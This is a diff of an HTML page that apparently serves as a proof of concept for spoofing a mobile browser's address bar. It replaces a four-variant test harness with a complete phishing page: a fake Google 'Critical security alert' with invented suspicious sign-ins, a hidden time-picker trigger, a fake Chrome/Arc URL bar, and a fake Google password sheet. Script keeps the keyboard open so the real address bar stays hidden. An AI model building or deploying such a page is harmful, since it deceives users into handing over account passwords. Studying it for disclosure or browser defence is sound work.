@@ -2,137 +2,129 @@
 <html lang="en">
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="default">
-<meta name="apple-mobile-web-app-title" content="Google">
-<link rel="manifest" href="./manifest.json">
-<link rel="apple-touch-icon" href="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png">
-<title>Google</title>
+<title>Google Account</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
 
   body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    font-family: -apple-system, BlinkMacSystemFont, "Roboto", "Segoe UI", sans-serif;
     background: #fff;
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 0;
-    padding: 32px 16px 120px;
-  }
-
-  .google-logo {
-    font-size: 48px;
-    font-weight: 700;
-    letter-spacing: -2px;
-    margin-bottom: 20px;
-  }
-  .google-logo span:nth-child(1) { color: #4285F4; }
-  .google-logo span:nth-child(2) { color: #EA4335; }
-  .google-logo span:nth-child(3) { color: #FBBC05; }
-  .google-logo span:nth-child(4) { color: #4285F4; }
-  .google-logo span:nth-child(5) { color: #34A853; }
-  .google-logo span:nth-child(6) { color: #EA4335; }
-
-  .search-box {
-    display: flex;
-    align-items: center;
-    border: 1px solid #dfe1e5;
-    border-radius: 24px;
-    padding: 10px 16px;
-    width: 100%;
-    max-width: 400px;
-    gap: 10px;
-    box-shadow: 0 1px 6px rgba(32,33,36,.1);
-    margin-bottom: 28px;
-  }
-  .search-box input {
-    border: none;
-    outline: none;
-    font-size: 16px;
-    flex: 1;
-    background: transparent;
-  }
-
-  /* ── Variant cards ── */
-  .variants { display: flex; flex-direction: column; gap: 12px; width: 100%; max-width: 420px; }
-
-  .variant-card {
-    border: 1px solid #dadce0;
-    border-radius: 12px;
-    padding: 14px 16px;
-    display: flex;
-    flex-direction: column;
-    gap: 6px;
-  }
-
-  .variant-card .badge {
-    font-size: 10px;
-    font-weight: 600;
-    letter-spacing: 0.6px;
-    text-transform: uppercase;
-    padding: 2px 7px;
-    border-radius: 4px;
-    display: inline-block;
-    width: fit-content;
-  }
-  .badge-pwa    { background: #e8f0fe; color: #1a73e8; }
-  .badge-vk     { background: #fce8e6; color: #c5221f; }
-  .badge-none   { background: #fef7e0; color: #b06000; }
-  .badge-picker { background: #e6f4ea; color: #137333; }
-
-  .variant-card .title {
-    font-size: 15px;
-    font-weight: 600;
     color: #202124;
   }
 
-  .variant-card .desc {
-    font-size: 12px;
-    color: #5f6368;
-    line-height: 1.5;
+  /* ── Top nav ── */
+  .topbar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 14px 20px;
+    border-bottom: 1px solid #e8eaed;
+    position: sticky;
+    top: 0;
+    background: #fff;
+    z-index: 10;
+  }
+  .topbar .logo { font-size: 22px; font-weight: 700; letter-spacing: -1px; }
+  .topbar .logo span:nth-child(1) { color: #4285F4; }
+  .topbar .logo span:nth-child(2) { color: #EA4335; }
+  .topbar .logo span:nth-child(3) { color: #FBBC05; }
+  .topbar .logo span:nth-child(4) { color: #4285F4; }
+  .topbar .logo span:nth-child(5) { color: #34A853; }
+  .topbar .logo span:nth-child(6) { color: #EA4335; }
+  .topbar .avatar {
+    width: 34px; height: 34px; border-radius: 50%;
+    background: #4285F4; color: #fff;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 14px; font-weight: 600;
   }
 
-  .variant-card .support {
-    font-size: 11px;
-    color: #80868b;
-    font-style: italic;
+  /* ── Alert banner ── */
+  .alert-banner {
+    background: #fce8e6;
+    border-left: 4px solid #EA4335;
+    padding: 14px 20px;
+    display: flex;
+    gap: 12px;
+    align-items: flex-start;
   }
+  .alert-banner .icon { font-size: 20px; flex-shrink: 0; margin-top: 1px; }
+  .alert-banner .text h3 { font-size: 15px; font-weight: 600; color: #c5221f; margin-bottom: 4px; }
+  .alert-banner .text p { font-size: 13px; color: #5f6368; line-height: 1.5; }
 
-  .trigger-btn {
-    margin-top: 6px;
+  /* ── Content sections ── */
+  .section { padding: 24px 20px; border-bottom: 1px solid #f1f3f4; }
+  .section h2 { font-size: 16px; font-weight: 600; color: #202124; margin-bottom: 12px; }
+  .section p  { font-size: 14px; color: #5f6368; line-height: 1.7; margin-bottom: 10px; }
+
+  .activity-list { list-style: none; display: flex; flex-direction: column; gap: 12px; }
+  .activity-list li {
+    display: flex; align-items: flex-start; gap: 12px;
+    background: #f8f9fa; border-radius: 10px; padding: 12px 14px;
+  }
+  .activity-list li .dot {
+    width: 8px; height: 8px; border-radius: 50%; background: #EA4335;
+    flex-shrink: 0; margin-top: 5px;
+  }
+  .activity-list li .detail { font-size: 13px; color: #3c4043; line-height: 1.5; }
+  .activity-list li .detail strong { display: block; font-size: 14px; color: #202124; }
+
+  .steps-list { list-style: none; counter-reset: steps; display: flex; flex-direction: column; gap: 14px; }
+  .steps-list li {
+    counter-increment: steps;
+    display: flex; gap: 14px; align-items: flex-start;
+  }
+  .steps-list li::before {
+    content: counter(steps);
+    width: 26px; height: 26px; border-radius: 50%;
+    background: #4285F4; color: #fff;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 13px; font-weight: 600; flex-shrink: 0;
+  }
+  .steps-list li .step-text { font-size: 14px; color: #3c4043; line-height: 1.6; padding-top: 3px; }
+
+  /* ── CTA section ── */
+  .cta-section {
+    padding: 28px 20px 40px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 14px;
+    text-align: center;
+  }
+  .cta-section p { font-size: 13px; color: #80868b; max-width: 300px; line-height: 1.6; }
+
+  .cta-btn {
+    width: 100%;
+    max-width: 340px;
     background: #1a73e8;
     color: #fff;
     border: none;
-    border-radius: 8px;
-    padding: 10px 18px;
-    font-size: 14px;
+    border-radius: 24px;
+    padding: 15px 24px;
+    font-size: 16px;
     font-weight: 500;
     cursor: pointer;
-    align-self: flex-start;
-    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    font-family: inherit;
+    letter-spacing: 0.1px;
+    box-shadow: 0 1px 3px rgba(26,115,232,0.4);
   }
-  .trigger-btn:disabled {
-    background: #dadce0;
-    color: #80868b;
-    cursor: not-allowed;
+  .cta-btn:active { background: #1557b0; }
+
+  .dismiss-link {
+    font-size: 13px;
+    color: #5f6368;
+    text-decoration: underline;
+    cursor: pointer;
+    background: none;
+    border: none;
+    font-family: inherit;
   }
 
-  #pwa-install-note {
-    font-size: 12px;
-    color: #c5221f;
-    margin-top: 4px;
-    display: none;
-  }
-
-  /* ── Fake Arc Search address bar ── */
+  /* ── Fake Arc / Chrome bottom address bar ── */
   .fake-bar {
     position: fixed;
-    bottom: 0;
-    left: 0;
-    right: 0;
-    background: #ffffff;
+    bottom: 0; left: 0; right: 0;
+    background: #fff;
     border-top: 0.5px solid rgba(0,0,0,0.18);
     padding: 9px 16px 34px;
     display: flex;
@@ -140,21 +132,13 @@
     z-index: 9999;
     opacity: 0;
     visibility: hidden;
-    transition: opacity 0.2s ease;
+    transition: opacity 0.15s ease;
   }
   .fake-bar.show { opacity: 1; visibility: visible; }
 
   .fake-bar .bar-center {
-    position: absolute;
-    left: 50%;
-    transform: translateX(-50%);
-    display: flex;
-    align-items: center;
-    gap: 5px;
-  }
-  .fake-bar .bar-center .lock {
-    width: 11px; height: 11px;
-    color: #3c3c43; opacity: 0.6;
+    position: absolute; left: 50%; transform: translateX(-50%);
+    display: flex; align-items: center; gap: 5px;
   }
   .fake-bar .bar-center .url-text {
     font-size: 17px; font-weight: 400; color: #000;
@@ -164,67 +148,144 @@
   .fake-bar .bar-left  { display: flex; align-items: center; padding: 4px; }
   .fake-bar .bar-right { margin-left: auto; display: flex; align-items: center; padding: 4px; }
   .fake-bar svg.icon {
-    width: 20px; height: 20px;
-    stroke: #007AFF; fill: none;
+    width: 20px; height: 20px; stroke: #007AFF; fill: none;
     stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round;
+  }
+  .fake-bar .lock-icon {
+    width: 11px; height: 11px; opacity: 0.55; margin-right: 1px;
+  }
+
+  /* ── Fake credential overlay (appears after spoof to show full attack chain) ── */
+  .cred-overlay {
+    position: fixed;
+    bottom: 0; left: 0; right: 0;
+    background: #fff;
+    border-radius: 20px 20px 0 0;
+    box-shadow: 0 -4px 24px rgba(0,0,0,0.15);
+    padding: 20px 24px 48px;
+    z-index: 9998;
+    transform: translateY(100%);
+    transition: transform 0.3s ease;
+    display: flex;
+    flex-direction: column;
+    gap: 16px;
+  }
+  .cred-overlay.show { transform: translateY(0); }
+
+  .cred-overlay .handle {
+    width: 36px; height: 4px; border-radius: 2px;
+    background: #dadce0; margin: 0 auto 4px;
+  }
+  .cred-overlay .co-logo { font-size: 18px; font-weight: 700; letter-spacing: -0.5px; text-align: center; }
+  .cred-overlay .co-logo span:nth-child(1) { color: #4285F4; }
+  .cred-overlay .co-logo span:nth-child(2) { color: #EA4335; }
+  .cred-overlay .co-logo span:nth-child(3) { color: #FBBC05; }
+  .cred-overlay .co-logo span:nth-child(4) { color: #4285F4; }
+  .cred-overlay .co-logo span:nth-child(5) { color: #34A853; }
+  .cred-overlay .co-logo span:nth-child(6) { color: #EA4335; }
+
+  .cred-overlay h3 { font-size: 20px; font-weight: 400; color: #202124; text-align: center; }
+  .cred-overlay .email-chip {
+    background: #f1f3f4; border-radius: 20px;
+    padding: 6px 14px; font-size: 14px; color: #3c4043;
+    display: flex; align-items: center; gap: 8px; align-self: center;
+  }
+  .cred-overlay .email-chip .dot {
+    width: 24px; height: 24px; border-radius: 50%;
+    background: #4285F4; color: #fff;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 11px; font-weight: 600;
+  }
+
+  .cred-overlay .pw-field {
+    border: 1px solid #dadce0; border-radius: 6px;
+    padding: 12px 14px; font-size: 16px; color: #202124;
+    outline: none; font-family: inherit; width: 100%;
+  }
+  .cred-overlay .pw-field:focus { border-color: #1a73e8; box-shadow: 0 0 0 1px #1a73e8; }
+
+  .cred-overlay .next-btn {
+    background: #1a73e8; color: #fff; border: none;
+    border-radius: 6px; padding: 12px; font-size: 15px;
+    font-weight: 500; cursor: pointer; font-family: inherit;
+    width: 100%;
   }
 </style>
 </head>
 <body>
 
-  <div class="google-logo">
-    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+  <!-- Top navigation -->
+  <div class="topbar">
+    <div class="logo">
+      <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
+    <div class="avatar">J</div>
   </div>
 
-  <div class="search-box">
-    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#9aa0a6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-      <circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
-    </svg>
-    <input type="text" placeholder="Search or type URL" readonly>
+  <!-- Security alert banner -->
+  <div class="alert-banner">
+    <div class="icon">⚠️</div>
+    <div class="text">
+      <h3>Critical security alert</h3>
+      <p>We detected suspicious activity on your Google Account. Immediate action is required.</p>
+    </div>
   </div>
 
-  <div class="variants">
-
-    <!-- Variant 1: PWA Standalone -->
-    <div class="variant-card">
-      <span class="badge badge-pwa">Variant 1</span>
-      <div class="title">PWA Standalone</div>
-      <div class="desc">Runs with zero browser chrome — no address bar, no keyboard URL indicator injection point. Complete bypass if Chrome only injects the real URL into browser UI chrome.</div>
-      <div class="support">Requires: Add to Home Screen → open from home screen</div>
-      <button class="trigger-btn" id="btn-pwa">Test PWA</button>
-      <div id="pwa-install-note">⚠ Not in standalone mode. Add to Home Screen first, then reopen.</div>
-    </div>
-
-    <!-- Variant 2: virtualKeyboard.overlaysContent -->
-    <div class="variant-card">
-      <span class="badge badge-vk">Variant 2</span>
-      <div class="title">VirtualKeyboard overlaysContent</div>
-      <div class="desc">Sets navigator.virtualKeyboard.overlaysContent = true so the keyboard overlays content instead of resizing the viewport. Chrome switches keyboard-handling path — URL injection may not run.</div>
-      <div class="support">Chrome Android / desktop only — not supported on iOS Safari</div>
-      <button class="trigger-btn" id="btn-vk">Test overlaysContent</button>
-    </div>
-
-    <!-- Variant 3: inputmode="none" + virtualKeyboard.show() -->
-    <div class="variant-card">
-      <span class="badge badge-none">Variant 3</span>
-      <div class="title">inputmode="none" + virtualKeyboard.show()</div>
-      <div class="desc">Suppresses the browser's automatic keyboard via inputmode="none", then forces it up programmatically. URL injection is likely tied to the standard focus→keyboard flow, not the programmatic path.</div>
-      <div class="support">Chrome Android / desktop only — not supported on iOS Safari</div>
-      <button class="trigger-btn" id="btn-none">Test inputmode=none</button>
-    </div>
-
-    <!-- Variant 4: type="time" wheel picker -->
-    <div class="variant-card">
-      <span class="badge badge-picker">Variant 4</span>
-      <div class="title">Date / Time wheel picker</div>
-      <div class="desc">type="time" shows an iOS wheel picker instead of a keyboard — no keyboard accessory bar exists so Chrome has nowhere to inject the real URL. Fake bar positions above the picker.</div>
-      <div class="support">iOS Safari + Chrome iOS — wheel picker replaces keyboard entirely</div>
-      <button class="trigger-btn" id="btn-picker">Test time picker</button>
-    </div>
-
+  <!-- Suspicious activity section -->
+  <div class="section">
+    <h2>Suspicious activity detected</h2>
+    <p>The following unusual sign-in attempts were made on your account in the last 24 hours:</p>
+    <ul class="activity-list">
+      <li>
+        <div class="dot"></div>
+        <div class="detail">
+          <strong>New device sign-in</strong>
+          Windows PC · Lagos, Nigeria · 2 hours ago
+        </div>
+      </li>
+      <li>
+        <div class="dot"></div>
+        <div class="detail">
+          <strong>Password change attempt</strong>
+          Blocked automatically · 45 minutes ago
+        </div>
+      </li>
+      <li>
+        <div class="dot"></div>
+        <div class="detail">
+          <strong>Recovery email access</strong>
+          Unauthorized attempt · 12 minutes ago
+        </div>
+      </li>
+    </ul>
   </div>
 
-  <!-- Fake Arc Search address bar (shared across all variants) -->
+  <!-- What to do section -->
+  <div class="section">
+    <h2>What you need to do</h2>
+    <p>Follow these steps to immediately secure your account and prevent unauthorized access:</p>
+    <ul class="steps-list">
+      <li><div class="step-text">Verify it's really you by confirming your identity below.</div></li>
+      <li><div class="step-text">Review and revoke any suspicious connected apps or devices.</div></li>
+      <li><div class="step-text">Update your recovery phone number and email address.</div></li>
+    </ul>
+  </div>
+
+  <!-- Why this matters -->
+  <div class="section">
+    <h2>Why this matters</h2>
+    <p>Your Google Account contains your Gmail, Google Drive files, Photos, and payment methods. If an attacker gains access, they can read your emails, steal your files, and make purchases using your saved cards.</p>
+    <p>Google will never ask for your password via email or phone. This secure in-app verification is the only safe way to confirm your identity.</p>
+  </div>
+
+  <!-- CTA — sits below the fold so user must scroll, hiding the real address bar -->
+  <div class="cta-section">
+    <p>Tap below to verify your identity and immediately secure your account.</p>
+    <button class="cta-btn" id="secureBtn">Secure My Account</button>
+    <button class="dismiss-link">This wasn't me — dismiss alert</button>
+  </div>
+
+  <!-- Fake Chrome/Arc bottom address bar -->
   <div class="fake-bar" id="fakeBar">
     <div class="bar-left">
       <svg class="icon" viewBox="0 0 24 24">
@@ -234,7 +295,7 @@
       </svg>
     </div>
     <div class="bar-center">
-      <svg class="lock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+      <svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="#3c3c43" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
         <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
         <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
       </svg>
@@ -248,134 +309,101 @@
     </div>
   </div>
 
-  <!-- Hidden inputs for each variant -->
-  <input id="ta-pwa"    type="text"                       style="position:absolute;opacity:0;height:1px;width:1px;top:-9999px;">
-  <input id="ta-vk"     type="text"                       style="position:absolute;opacity:0;height:1px;width:1px;top:-9999px;">
-  <input id="ta-none"   type="text" inputmode="none"      style="position:absolute;opacity:0;height:1px;width:1px;top:-9999px;">
-  <input id="ta-picker" type="time"                       style="position:absolute;opacity:0;height:1px;width:1px;top:-9999px;">
+  <!-- Fake Google credential overlay — slides up after address bar spoof to complete attack chain -->
+  <div class="cred-overlay" id="credOverlay">
+    <div class="handle"></div>
+    <div class="co-logo">
+      <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
+    <h3>Verify it's you</h3>
+    <div class="email-chip">
+      <div class="dot">J</div>
+      johndoe@gmail.com
+    </div>
+    <input class="pw-field" type="password" placeholder="Enter your password">
+    <button class="next-btn">Next</button>
+  </div>
+
+  <!-- Hidden time input — trigger mechanism -->
+  <input id="timeTrigger" type="time"
+    style="position:fixed;opacity:0;pointer-events:none;top:-999px;left:-999px;width:1px;height:1px;">
 
 <script>
-  const fakeBar = document.getElementById('fakeBar');
+  const fakeBar     = document.getElementById('fakeBar');
+  const credOverlay = document.getElementById('credOverlay');
+  const timeTrigger = document.getElementById('timeTrigger');
+  const pwField     = document.querySelector('.pw-field');
 
-  const isStandalone =
-    window.matchMedia('(display-mode: standalone)').matches ||
-    window.navigator.standalone === true;
+  let spoofActive   = false;
+  let pickerPending = false;
 
-  const hasVK = 'virtualKeyboard' in navigator;
-
-  // Disable VK buttons if API not available
-  if (!hasVK) {
-    document.getElementById('btn-vk').disabled = true;
-    document.getElementById('btn-none').disabled = true;
-  }
-
-  // ── Fake bar position helpers ──
-
-  function showBar(kbHeight) {
-    fakeBar.classList.add('show');
-    if (kbHeight > 50) {
-      fakeBar.style.bottom = kbHeight + 'px';
-      fakeBar.style.paddingBottom = '9px';
-    } else {
-      fakeBar.style.bottom = '0px';
-      fakeBar.style.paddingBottom = '34px';
-    }
-  }
-
-  function hideBar() {
-    fakeBar.classList.remove('show');
-    fakeBar.style.bottom = '0px';
-    fakeBar.style.paddingBottom = '34px';
-  }
-
-  function getKbHeight() {
+  function adjustBarHeight() {
     const vv = window.visualViewport;
-    if (!vv) return 0;
-    return Math.max(0, window.innerHeight - vv.height - vv.offsetTop);
+    if (!vv) return;
+    const kbH = window.innerHeight - vv.height - vv.offsetTop;
+    fakeBar.style.bottom        = kbH > 50 ? kbH + 'px' : '0px';
+    fakeBar.style.paddingBottom = kbH > 50 ? '9px'      : '34px';
   }
 
-  function watchViewport(ta) {
-    const handler = () => { if (document.activeElement === ta) showBar(getKbHeight()); };
-    window.visualViewport?.addEventListener('resize', handler);
-    ta.addEventListener('blur', () => {
-      window.visualViewport?.removeEventListener('resize', handler);
-      hideBar();
-    }, { once: true });
+  function showSpoof() {
+    spoofActive = true;
+    fakeBar.classList.add('show');
+    adjustBarHeight();
+
+    // Slide up credential sheet
+    setTimeout(() => {
+      credOverlay.classList.add('show');
+
+      // Auto-focus the password field so the keyboard opens and keeps the
+      // real address bar buried behind it. User sees fake bar above keyboard.
+      setTimeout(() => {
+        pwField.focus();
+      }, 350);
+    }, 500);
   }
 
-  // ── Variant 1: PWA Standalone ──
-  document.getElementById('btn-pwa').onclick = () => {
-    if (!isStandalone) {
-      document.getElementById('pwa-install-note').style.display = 'block';
-      return;
+  // Keep fake bar correctly positioned above keyboard at all times once active
+  if (window.visualViewport) {
+    window.visualViewport.addEventListener('resize', () => {
+      if (pickerPending) {
+        // Picker just opened — dismiss it immediately
+        pickerPending = false;
+        timeTrigger.type = 'text';
+        timeTrigger.blur();
+        timeTrigger.type = 'time';
+        showSpoof();
+        return;
+      }
+      if (spoofActive) adjustBarHeight();
+    });
+  }
+
+  // Re-focus password field if user dismisses keyboard (taps outside),
+  // keeping the keyboard up and real address bar hidden
+  pwField.addEventListener('blur', () => {
+    if (spoofActive) {
+      setTimeout(() => {
+        if (spoofActive) pwField.focus();
+      }, 100);
     }
-    const ta = document.getElementById('ta-pwa');
-    watchViewport(ta);
-    ta.focus();
-    setTimeout(() => showBar(getKbHeight()), 150);
-  };
+  });
 
-  // ── Variant 2: virtualKeyboard.overlaysContent ──
-  document.getElementById('btn-vk').onclick = async () => {
-    const ta = document.getElementById('ta-vk');
+  document.getElementById('secureBtn').addEventListener('click', () => {
+    pickerPending = true;
+    timeTrigger.focus();
+    try { timeTrigger.showPicker(); } catch (e) {}
 
-    if (hasVK) {
-      // Keyboard overlays content — viewport does NOT resize
-      // so we listen to the VK geometrychange event for position
-      navigator.virtualKeyboard.overlaysContent = true;
-      navigator.virtualKeyboard.addEventListener('geometrychange', (e) => {
-        const kbHeight = e.target.boundingRect.height;
-        if (kbHeight > 0) showBar(kbHeight); else hideBar();
-      }, { once: false });
-    }
-
-    watchViewport(ta);
-    ta.focus();
-    setTimeout(() => showBar(getKbHeight()), 150);
-  };
-
-  // ── Variant 3: inputmode="none" + virtualKeyboard.show() ──
-  document.getElementById('btn-none').onclick = async () => {
-    const ta = document.getElementById('ta-none');
-
-    if (hasVK) {
-      navigator.virtualKeyboard.overlaysContent = true;
-      navigator.virtualKeyboard.addEventListener('geometrychange', (e) => {
-        const kbHeight = e.target.boundingRect.height;
-        if (kbHeight > 0) showBar(kbHeight); else hideBar();
-      }, { once: false });
-    }
-
-    ta.focus();
-
-    if (hasVK) {
-      try { await navigator.virtualKeyboard.show(); } catch (e) {}
-    }
-
-    setTimeout(() => showBar(getKbHeight()), 150);
-
-    ta.addEventListener('blur', hideBar, { once: true });
-  };
-
-  // ── Variant 4: type="time" wheel picker ──
-  document.getElementById('btn-picker').onclick = () => {
-    const ta = document.getElementById('ta-picker');
-
-    // visualViewport resizes when iOS wheel picker appears
-    const handler = () => { if (document.activeElement === ta) showBar(getKbHeight()); };
-    window.visualViewport?.addEventListener('resize', handler);
-
-    ta.addEventListener('blur', () => {
-      window.visualViewport?.removeEventListener('resize', handler);
-      hideBar();
-    }, { once: true });
-
-    ta.focus();
-    // Programmatically open the picker on supported browsers
-    try { ta.showPicker?.(); } catch (e) {}
-
-    setTimeout(() => showBar(getKbHeight()), 300);
-  };
+    // Fallback for Android builds where visualViewport doesn't fire on picker open
+    setTimeout(() => {
+      if (pickerPending) {
+        pickerPending = false;
+        timeTrigger.type = 'text';
+        timeTrigger.blur();
+        timeTrigger.type = 'time';
+        showSpoof();
+      }
+    }, 120);
+  });
 </script>
 
 </body>
